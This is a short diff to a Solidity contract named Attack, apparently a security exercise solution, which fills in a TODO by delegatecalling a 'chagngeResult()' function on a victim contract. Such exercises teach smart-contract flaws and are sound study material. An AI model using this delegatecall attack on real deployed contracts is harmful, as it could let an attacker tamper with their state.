@@ -21,5 +21,9 @@ contract Attack {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        bytes memory data = abi.encodeWithSignature("chagngeResult()");
+        (bool success, ) = victim.delegatecall(data);
+        require(success, "delegatecall failed");
     }
 }
+
